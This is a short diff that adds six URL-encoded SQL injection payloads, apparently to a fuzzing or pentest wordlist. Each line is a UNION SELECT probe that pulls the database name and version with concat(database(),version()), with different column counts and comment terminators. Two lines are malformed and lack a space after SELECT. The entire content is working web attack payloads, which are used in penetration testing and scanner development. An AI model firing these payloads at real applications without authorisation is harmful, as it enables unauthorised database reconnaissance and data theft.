@@ -1,0 +1,6 @@
+'+UNION+SELECT+1,2,3,concat(database(),version()),5--
+'+UNION+SELECTconcat(database(),version()),5--+
+'+UNION+SELECTconcat(database(),version()),5+--
+'+UNION+SELECT+1,2,3,4,concat(database(),version())+--
+'+UNION+SELECT+1,2,3,4,concat(database(),version())--+
+'+UNION+SELECT+1,2,3,4,concat(database(),version())--
